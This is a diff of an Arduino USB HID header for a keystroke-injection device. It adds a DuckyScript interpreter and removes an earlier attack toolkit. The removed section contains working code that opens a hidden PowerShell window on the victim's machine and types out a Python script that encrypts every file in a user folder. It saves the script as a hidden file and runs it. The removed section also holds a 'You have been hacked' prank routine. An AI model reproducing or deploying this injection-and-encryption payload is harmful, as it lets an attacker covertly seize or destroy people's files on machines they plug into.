@@ -1,371 +1,307 @@
 #ifndef USB_TOOLS_H
 #define USB_TOOLS_H
 
+#include <map>
+#include <vector>
+#include <Arduino.h>
+
 #include "USB.h"
 #include "USBHIDKeyboard.h"
 #include "USBHIDMouse.h"
-#include "Configs.h"
 
-USBHIDMouse Mouse;
-USBHIDKeyboard Keyboard;
+// ----------------- Global HID objects -----------------
+static USBHIDMouse Mouse;
+static USBHIDKeyboard Keyboard;
 
-//----------------- start USB ---------------------
-void startUSB(const char* dev) {
+// ----------------- State & storage -----------------
+static int defaultDelay = 30;     // ms between commands (can be overridden by DEFAULT_DELAY)
+static String lastCmd = "";     // last executed command (for REPEAT)
+static std::map<String, String> vars;    // user variables
+static std::map<String, String> macros;  // recorded macros
+
+// ----------------- Helpers -----------------
+// Trim + normalize a line
+static String clean(const String &s_in) {
+  String s = s_in;
+  s.trim();
+  s.replace("\r", "");
+  return s;
+}
+
+// Expand ${name} placeholders using vars map
+static String expandVars(const String &in) {
+  String out = in;
+  for (auto &p : vars) out.replace("${" + p.first + "}", p.second);
+  return out;
+}
+
+// Evaluate a simple binary condition with optional variable lookup
+static bool evalCond(String left, const String &op, String right) {
+  left.trim(); right.trim();
+  if (vars.count(left)) left = vars[left];
+  if (vars.count(right)) right = vars[right];
+
+  // If both look numeric, compare numerically for > and <
+  if (op == "==") return left == right;
+  if (op == "!=") return left != right;
+  if (op == ">")  return left.toInt() > right.toInt();
+  if (op == "<")  return left.toInt() < right.toInt();
+  return false;
+}
+
+// ----------------- USB start -----------------
+// Use: startUSB("Keyboard"), startUSB("Mouse"), startUSB("Both")
+static void startUSB(const String &dev) {
   USB.begin();
-  if(dev == "Keyboard") {
-    Keyboard.begin();
+  if (dev.equalsIgnoreCase("Keyboard")) Keyboard.begin();
+  else if (dev.equalsIgnoreCase("Mouse")) Mouse.begin();
+  else if (dev.equalsIgnoreCase("Both")) { Keyboard.begin(); Mouse.begin(); }
+  delay(defaultDelay * 30); // small pause after USB initialization
+}
+
+// ----------------- DuckyScript interpreter -----------------
+static void DuckyScript(const String &script);
+
+// Helper: execute a block (used for loops and macros)
+static void executeBlock(const String &block) {
+  DuckyScript(block);
+}
+
+// Main interpreter
+static void DuckyScript(const String &script) {
+  // Split into lines
+  std::vector<String> lines;
+  int pos = 0;
+  while (pos < script.length()) {
+    int e = script.indexOf('\n', pos);
+    if (e == -1) e = script.length();
+    lines.push_back(clean(script.substring(pos, e)));
+    pos = e + 1;
   }
-  else if(dev == "Mouse") {
-    Mouse.begin();
-  } 
-  else if(dev == "Both") {
-    Keyboard.begin();
-    Mouse.begin();
-  } 
-  delay(Delay * 30); // Initial pause
-}
-//----------------- typeLine ---------------------
-void typeLine(const char* line) {
-  Keyboard.print(line);
-  Keyboard.write(KEY_RETURN);
-  delay(Delay);
-}
 
-//----------------- program ----------------------
-void program(const char* Progarm) {
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  Keyboard.releaseAll();
-  delay(Delay * 10);
-  typeLine(Progarm);
-  delay(Delay * 20); // wait for app to load
-}
+  for (size_t i = 0; i < lines.size(); i++) {
+    String line = lines[i];
+    if (line.isEmpty()) continue;
+    if (line.startsWith("REM")) continue; // comment
 
-//---------------- switchBack --------------------
-void switchBack() {
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(KEY_TAB);
-  Keyboard.releaseAll();
-  delay(Delay * 3);
-}
+    // ====== VARIABLE DECLARATION: VAR name = value
+    if (line.startsWith("VAR ")) {
+      int eq = line.indexOf('=');
+      if (eq > 0) {
+        String name = clean(line.substring(4, eq));
+        String value = clean(line.substring(eq + 1));
+        value = expandVars(value); // support dynamic assignment
+        vars[name] = value;
+      }
+    }
 
-//------------------ bypass ----------------------
-void bypass() {
-  // Dismiss popups
-  Keyboard.write(KEY_RETURN);
-  delay(Delay * 25);
+    // ====== MACRO RECORDING: MACRO name / MACROEND
+    else if (line.startsWith("MACRO ")) {
+      String mname = clean(line.substring(6));
+      String block = "";
+      int nest = 0;
+      while (++i < lines.size()) {
+        String l = lines[i];
+        if (l.startsWith("MACRO ")) nest++;
+        else if (l == "MACROEND" && nest == 0) break;
+        else if (l == "MACROEND") nest--;
+        block += l + "\n";
+      }
+      macros[mname] = block;
+    }
 
-  // Try "Enable Editing"
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press('e');
-  Keyboard.releaseAll();
-  delay(Delay * 50);
-}
+    // ====== RUNMACRO name [count]
+    else if (line.startsWith("RUNMACRO ")) {
+      String rest = clean(line.substring(9));
+      int sp = rest.indexOf(' ');
+      String mname = (sp == -1) ? rest : rest.substring(0, sp);
+      int count = 1;
+      if (sp != -1) count = rest.substring(sp + 1).toInt();
+      if (macros.count(mname)) {
+        for (int r = 0; r < count; r++) executeBlock(macros[mname]);
+      } else {
+        Serial.println("[ERR] Unknown macro: " + mname);
+      }
+    }
 
-//----------------- copyPaste --------------------
-void copyPaste(char value) {
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(value);
-  Keyboard.releaseAll();
-  delay(Delay * 3);
-}
+    // ====== IF ... ELSE / ENDIF ======
+    else if (line.startsWith("IF ")) {
+      String cond = clean(line.substring(3));
+      // parse left op right - assume single-space separated tokens
+      int p1 = cond.indexOf(' ');
+      int p2 = cond.indexOf(' ', p1 + 1);
+      if (p1 > 0 && p2 > p1) {
+        String left = cond.substring(0, p1);
+        String op   = cond.substring(p1 + 1, p2);
+        String right = cond.substring(p2 + 1);
+        bool result = evalCond(left, op, right);
+        if (!result) {
+          // skip to ELSE or ENDIF respecting nesting
+          int nest = 0;
+          while (++i < lines.size()) {
+            String l = lines[i];
+            if (l.startsWith("IF ")) nest++;
+            else if (l == "ENDIF" && nest == 0) break;
+            else if (l == "ELSE" && nest == 0) break;
+            else if (l == "ENDIF") nest--;
+          }
+        }
+      }
+    }
+    else if (line == "ELSE") {
+      int nest = 0;
+      while (++i < lines.size()) {
+        String l = lines[i];
+        if (l.startsWith("IF ")) nest++;
+        else if (l == "ENDIF" && nest == 0) break;
+        else if (l == "ENDIF") nest--;
+      }
+    }
+    else if (line == "ENDIF") {
+      // no-op: handled by skipping logic
+    }
 
-//------------------- arrow ----------------------
-void arrow(char direction) {
-  switch (direction) {
-    case 'U': Keyboard.write(KEY_UP_ARROW); break;
-    case 'D': Keyboard.write(KEY_DOWN_ARROW); break;
-    case 'R': Keyboard.write(KEY_RIGHT_ARROW); break;
-    case 'L': Keyboard.write(KEY_LEFT_ARROW); break;
-  }
-  delay(Delay * 3);
-}
+    // ====== LOOP n / ENDLOOP ======
+    else if (line.startsWith("LOOP ")) {
+      int n = line.substring(5).toInt();
+      int loopStart = i + 1;
+      int nest = 0, endIdx = -1;
+      for (size_t j = loopStart; j < lines.size(); j++) {
+        if (lines[j].startsWith("LOOP ")) nest++;
+        else if (lines[j] == "ENDLOOP" && nest == 0) { endIdx = j; break; }
+        else if (lines[j] == "ENDLOOP") nest--;
+      }
+      if (endIdx == -1) { Serial.println("[ERR] Missing ENDLOOP"); break; }
 
-void waitFor(int ms) {
-  delay(ms);
-}
+      // Build block
+      String block = "";
+      for (size_t k = loopStart; k < endIdx; k++) block += lines[k] + "\n";
 
-void typeText(String text, bool enter = false) {
-  Keyboard.print(text);
-  if (enter) {
-    Keyboard.write(KEY_RETURN);
-  }
-  waitFor(Delay);
-}
+      for (int r = 0; r < n; r++) executeBlock(block);
+      i = endIdx; // continue after ENDLOOP
+    }
 
-void pressCombo(const char* combo) {
-  // Example: "CTRL+SHIFT+ESC"
-  if (strstr(combo, "CTRL")) Keyboard.press(KEY_LEFT_CTRL);
-  if (strstr(combo, "SHIFT")) Keyboard.press(KEY_LEFT_SHIFT);
-  if (strstr(combo, "ALT")) Keyboard.press(KEY_LEFT_ALT);
-  if (strstr(combo, "GUI")) Keyboard.press(KEY_LEFT_GUI);
-
-  if (strstr(combo, "ESC")) Keyboard.press(KEY_ESC);
-  if (strstr(combo, "TAB")) Keyboard.press(KEY_TAB);
-  if (strstr(combo, "F4")) Keyboard.press(KEY_F4);
-  if (strstr(combo, "L")) Keyboard.press('l'); // For Win+L
-
-  Keyboard.releaseAll();
-  waitFor(Delay);
-}
-
-//------------------- system actions -------------------------
-void openRunDialog() {
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  Keyboard.releaseAll();
-  waitFor(Delay * 10);
-}
-
-void openCMD() {
-  openRunDialog();
-  typeText("cmd", true);
-  waitFor(Delay * 20);
-}
-
-void openExplorer(const char* path) {
-  openRunDialog();
-  typeText(path, true);
-}
-
-void openBrowser(const char* url) {
-  openRunDialog();
-  typeText("chrome", true); // change to "msedge" or "firefox"
-  waitFor(Delay * 50);
-  typeText(url, true);
-}
-
-void altTab(int times = 1) {
-  for (int i = 0; i < times; i++) {
-    Keyboard.press(KEY_LEFT_ALT);
-    Keyboard.press(KEY_TAB);
-    Keyboard.releaseAll();
-    waitFor(Delay * 5);
-  }
-}
-
-void taskManager() {
-  pressCombo("CTRL+SHIFT+ESC");
-}
-
-void closeWindow() {
-  pressCombo("ALT+F4");
-}
-
-void screenshot() {
-  Keyboard.write(KEY_PRINT_SCREEN);
-  waitFor(Delay * 10);
-}
-
-void newDesktop() {
-  pressCombo("CTRL+GUI+D");
-}
-
-void lockPC() {
-  pressCombo("GUI+L");
-}
-
-//--------------- Python Script ------------------
-void py_script() {
-  // Launch PowerShell in hidden window
-  program("powershell -WindowStyle Hidden");
-
-  // Set PowerShell variable for target folder path
-  String psTargetFolder = String("$targetFolder = \"$env:USERPROFILE\\") + target + "\"";
-  typeLine(psTargetFolder.c_str());
-
-  // Export env variable for Python script usage
-  typeLine("Set-Item -Path Env:TARGET_FOLDER -Value $targetFolder");
-
-  // Start PowerShell here-string for Python script content
-  typeLine("@\"");
-
-  // ---- Python script begins ----
-  typeLine("import os, sys, time, base64, shutil, subprocess");
-  typeLine("try:");
-  typeLine("    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC");
-  typeLine("    from cryptography.fernet import Fernet");
-  typeLine("    from cryptography.hazmat.primitives import hashes");
-  typeLine("    from cryptography.hazmat.backends import default_backend");
-  typeLine("except ImportError:");
-  typeLine("    print('[!] cryptography not found. Installing...')");
-  typeLine("    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])");
-  typeLine("    print('[+] Installed. Restarting script...')");
-  typeLine("    os.execv(sys.executable, [sys.executable] + sys.argv)");
-  typeLine("");
-  typeLine("TARGET_FOLDER = os.getenv('TARGET_FOLDER')");
-  typeLine("SALT = b'educational_demo_salt!'");
-  typeLine("ITERATIONS = 390000");
-  typeLine("KEY_FILE = 'keyfile.key'");
-  typeLine("KEY_BACKUP_FILE = os.path.expanduser('~/Documents/keyfile_backup.key')");
-  typeLine("LOG_FILE = 'encryptor.log'");
-  typeLine("PASSWORD = '12345678'");
-  typeLine(("MODE = '" + String(pymode) + "'").c_str());
-  typeLine("");
-  typeLine("def log(msg):");
-  typeLine("    with open(LOG_FILE, 'a', encoding='utf-8') as f:");
-  typeLine("        f.write(f\"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\\n\")");
-  typeLine("    print(msg)");
-  typeLine("");
-  typeLine("def derive_key(password, salt):");
-  typeLine("    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS, backend=default_backend())");
-  typeLine("    return base64.urlsafe_b64encode(kdf.derive(password.encode()))");
-  typeLine("");
-  typeLine("def save_key(key):");
-  typeLine("    with open(KEY_FILE, 'wb') as f: f.write(key)");
-  typeLine("    log(f'[+] Key saved to {KEY_FILE}')");
-  typeLine("    try:");
-  typeLine("        os.makedirs(os.path.dirname(KEY_BACKUP_FILE), exist_ok=True)");
-  typeLine("        shutil.copy2(KEY_FILE, KEY_BACKUP_FILE)");
-  typeLine("        log(f'[+] Backup key saved to {KEY_BACKUP_FILE}')");
-  typeLine("    except Exception as e:");
-  typeLine("        log(f'[!] Failed to backup key: {e}')");
-  typeLine("");
-  typeLine("def load_key():");
-  typeLine("    with open(KEY_FILE, 'rb') as f: key = f.read()");
-  typeLine("    log(f'[+] Key loaded from {KEY_FILE}')");
-  typeLine("    return key");
-  typeLine("");
-  typeLine("def get_all_files(folder):");
-  typeLine("    paths = []");
-  typeLine("    for root, _, files in os.walk(folder):");
-  typeLine("        for file in files:");
-  typeLine("            path = os.path.join(root, file)");
-  typeLine("            if os.path.abspath(path) != os.path.abspath(KEY_FILE):");
-  typeLine("                paths.append(path)");
-  typeLine("    return paths");
-  typeLine("");
-  typeLine("def progress_bar(current, total):");
-  typeLine("    percent = int((current / total) * 100)");
-  typeLine("    bar = '#' * (percent // 2) + '-' * (50 - percent // 2)");
-  typeLine("    sys.stdout.write(f\"\\r[{bar}] {percent}%\")");
-  typeLine("    sys.stdout.flush()");
-  typeLine("");
-  typeLine("def encrypt_folder(folder, fernet):");
-  typeLine("    files = get_all_files(folder)");
-  typeLine("    total = len(files)");
-  typeLine("    for i, path in enumerate(files, 1):");
-  typeLine("        try:");
-  typeLine("            with open(path, 'rb') as f: data = f.read()");
-  typeLine("            with open(path, 'wb') as f: f.write(fernet.encrypt(data))");
-  typeLine("            log(f'[+] Encrypted: {path}')");
-  typeLine("        except Exception as e:");
-  typeLine("            log(f'[!] Failed to encrypt {path}: {e}')");
-  typeLine("        progress_bar(i, total)");
-  typeLine("    print()");
-  typeLine("");
-  typeLine("def decrypt_folder(folder, fernet):");
-  typeLine("    files = get_all_files(folder)");
-  typeLine("    total = len(files)");
-  typeLine("    for i, path in enumerate(files, 1):");
-  typeLine("        try:");
-  typeLine("            with open(path, 'rb') as f: data = f.read()");
-  typeLine("            dec = fernet.decrypt(data)");
-  typeLine("            with open(path, 'wb') as f: f.write(dec)");
-  typeLine("            log(f'[-] Decrypted: {path}')");
-  typeLine("        except Exception as e:");
-  typeLine("            log(f'[!] Failed to decrypt {path}: {e}')");
-  typeLine("        progress_bar(i, total)");
-  typeLine("    print()");
-  typeLine("");
-  typeLine("if __name__ == '__main__':");
-  typeLine("    os.makedirs(TARGET_FOLDER, exist_ok=True)");
-  typeLine("    log('=== Safe Dual-Mode Started ===')");
-  typeLine("    if os.path.exists(KEY_FILE):");
-  typeLine("        log('[*] Key file found.')");
-  typeLine("        key = load_key()");
-  typeLine("    else:");
-  typeLine("        key = derive_key(PASSWORD, SALT)");
-  typeLine("        save_key(key)");
-  typeLine("    fernet = Fernet(key)");
-  typeLine("    if MODE == 'e':");
-  typeLine("        encrypt_folder(TARGET_FOLDER, fernet)");
-  typeLine("    elif MODE == 'd':");
-  typeLine("        decrypt_folder(TARGET_FOLDER, fernet)");
-  typeLine("    else:");
-  typeLine("        log('[!] Invalid mode.')");
-  typeLine("    log('=== Process Finished ===')");
-  // ---- Python script ends ----
-
-  // Save Python script to user profile root folder as hidden file
-  typeLine("\"@ | Set-Content $env:USERPROFILE\\safe_dual_mode.py");
-  typeLine("Set-ItemProperty \"$env:USERPROFILE\\safe_dual_mode.py\" -Name Attributes -Value Hidden");
-
-  // Execute Python script
-  typeLine("python $env:USERPROFILE\\safe_dual_mode.py");
-
-  // Exit PowerShell session
-  typeLine("exit");
-
-}
-
-//-------------- YouTube Richroll -----------------
-void pingSite() {
-  program(linkURL);
-}
-
-//-------------- Barrel Roll Mode -----------------
-void barrelRollMode() {
-  program("cmd");
-  typeLine("start https://www.google.com/search?q=do+a+barrel+roll");
-  typeLine("exit");
-}
-
-//--------------- notepad Mode --------------------
-void notepadMode() {
-  program("notepad");
-  typeLine("You have been hacked.");
-}
-
-//----------------- pin loop ----------------------
-void typePIN(const char* pin) {
-  while (*pin) {
-    Keyboard.write(*pin);
-    delay(1);
-    pin++;
-  }
-}
-
-//---------------- DuckyScript Engine -------------
-void runDuckyScript(String script) {
-  int start = 0;
-  while (true) {
-    int end = script.indexOf('\n', start);
-    String line = (end == -1) ? script.substring(start) : script.substring(start, end);
-    line.trim();
-    start = (end == -1) ? script.length() : end + 1;
-
-    if (line.length() == 0 || line.startsWith("REM")) continue;
-
-    // --- Core DuckyScript keywords ---
-    if (line.startsWith("STRING ")) {
-      String text = line.substring(7);
+    // ====== STRING / STRINGLN ======
+    else if (line.startsWith("STRINGLN ")) {
+      String text = expandVars(line.substring(9));
+      Keyboard.print(text);
+      Keyboard.write(KEY_RETURN);
+    }
+    else if (line.startsWith("STRING ")) {
+      String text = expandVars(line.substring(7));
       Keyboard.print(text);
     }
+
+    // ====== STANDARD KEYS ======
     else if (line.equalsIgnoreCase("ENTER")) Keyboard.write(KEY_RETURN);
     else if (line.equalsIgnoreCase("TAB")) Keyboard.write(KEY_TAB);
     else if (line.equalsIgnoreCase("ESCAPE")) Keyboard.write(KEY_ESC);
     else if (line.equalsIgnoreCase("SPACE")) Keyboard.write(' ');
-    else if (line.startsWith("DELAY ")) {
-      int ms = line.substring(6).toInt();
-      delay(ms);
+    else if (line.equalsIgnoreCase("UP")) Keyboard.write(KEY_UP_ARROW);
+    else if (line.equalsIgnoreCase("DOWN")) Keyboard.write(KEY_DOWN_ARROW);
+    else if (line.equalsIgnoreCase("LEFT")) Keyboard.write(KEY_LEFT_ARROW);
+    else if (line.equalsIgnoreCase("RIGHT")) Keyboard.write(KEY_RIGHT_ARROW);
+    else if (line.equalsIgnoreCase("CAPSLOCK")) Keyboard.write(KEY_CAPS_LOCK);
+    else if (line.equalsIgnoreCase("MENU")) Keyboard.write(KEY_MENU);
+
+    // ====== FUNCTION KEYS F1..F12 (e.g. F5) ======
+    else if (line.length() > 1 && (line[0] == 'F' || line[0] == 'f') && isDigit(line[1])) {
+      int f = line.substring(1).toInt();
+      if (f >= 1 && f <= 12) Keyboard.write(KEY_F1 + (f - 1));
     }
-    else if (line.startsWith("GUI ")) {
-      char key = line.substring(4)[0];
+
+    // ====== DELAY & DEFAULT_DELAY ======
+    else if (line.startsWith("DELAY ")) delay(line.substring(6).toInt());
+    else if (line.startsWith("DEFAULT_DELAY ")) defaultDelay = line.substring(14).toInt();
+
+    // ====== REPEAT n ======
+    else if (line.startsWith("REPEAT ")) {
+      int n = line.substring(7).toInt();
+      for (int r = 0; r < n; r++) {
+        if (!lastCmd.isEmpty()) {
+          // execute lastCmd as a single-line script
+          DuckyScript(lastCmd + "\n");
+        }
+        delay(defaultDelay);
+      }
+    }
+
+    // ====== GUI / WINDOWS <char or KEYNAME> ======
+    else if (line.startsWith("GUI ") || line.startsWith("WINDOWS ")) {
+      String keypart = clean(line.substring(line.indexOf(' ') + 1));
+      // if single char, send that with GUI
       Keyboard.press(KEY_LEFT_GUI);
-      Keyboard.press(key);
+      if (keypart.length() == 1) {
+        Keyboard.press(keypart[0]);
+      } else {
+        // try named keys like 'r' or 'R' or 'TAB' etc. fallback to sending first char
+        Keyboard.press(keypart[0]);
+      }
       Keyboard.releaseAll();
     }
-    else if (line.startsWith("CTRL") || line.startsWith("ALT") || line.startsWith("SHIFT")) {
+
+    // ====== COMBO KEYS (CTRL/ALT/SHIFT + KEY) ======
+    else if (line.indexOf("CTRL") >= 0 || line.indexOf("ALT") >= 0 || line.indexOf("SHIFT") >= 0) {
       if (line.indexOf("CTRL") >= 0) Keyboard.press(KEY_LEFT_CTRL);
       if (line.indexOf("ALT") >= 0) Keyboard.press(KEY_LEFT_ALT);
       if (line.indexOf("SHIFT") >= 0) Keyboard.press(KEY_LEFT_SHIFT);
       if (line.indexOf("DEL") >= 0) Keyboard.press(KEY_DELETE);
       if (line.indexOf("ESC") >= 0) Keyboard.press(KEY_ESC);
+      if (line.indexOf("TAB") >= 0) Keyboard.press(KEY_TAB);
+      if (line.indexOf("ENTER") >= 0) Keyboard.press(KEY_RETURN);
       Keyboard.releaseAll();
     }
-    delay(Delay);
-    if (end == -1) break;
+
+    // ====== PRINT (debug) ======
+    else if (line.startsWith("PRINT ")) {
+      String msg = expandVars(line.substring(6));
+      Serial.println("[PRINT] " + msg);
+    }
+
+    // ====== WAIT <ms>  OR WAIT var==value (polling) ======
+    else if (line.startsWith("WAIT ")) {
+      String arg = clean(line.substring(5));
+      int eqpos = arg.indexOf("==");
+      if (eqpos > 0) {
+        String var = clean(arg.substring(0, eqpos));
+        String val = clean(arg.substring(eqpos + 2));
+        // poll until equal
+        while (!vars.count(var) || vars[var] != val) delay(50);
+      } else {
+        delay(arg.toInt());
+      }
+    }
+
+    // ====== MOUSE commands ======
+    else if (line.startsWith("MOUSE MOVE ")) {
+      // MOUSE MOVE x y
+      String rest = clean(line.substring(11));
+      int sp = rest.indexOf(' ');
+      if (sp > 0) {
+        int x = rest.substring(0, sp).toInt();
+        int y = rest.substring(sp + 1).toInt();
+        Mouse.move(x, y);
+      }
+    }
+    else if (line.startsWith("MOUSE CLICK ")) {
+      String btn = clean(line.substring(12));
+      if (btn.equalsIgnoreCase("LEFT")) Mouse.click(MOUSE_LEFT);
+      else if (btn.equalsIgnoreCase("RIGHT")) Mouse.click(MOUSE_RIGHT);
+      else if (btn.equalsIgnoreCase("MIDDLE")) Mouse.click(MOUSE_MIDDLE);
+    }
+    else if (line.startsWith("MOUSE SCROLL ")) {
+      int s = clean(line.substring(13)).toInt();
+      Mouse.move(0, 0, s);
+    }
+
+    // ====== Fallback: unknown command ======
+    else {
+      Serial.println("[WARN] Unknown command: " + line);
+    }
+
+    // Save last non-empty command for REPEAT
+    lastCmd = line;
+    delay(defaultDelay);
   }
 }
 
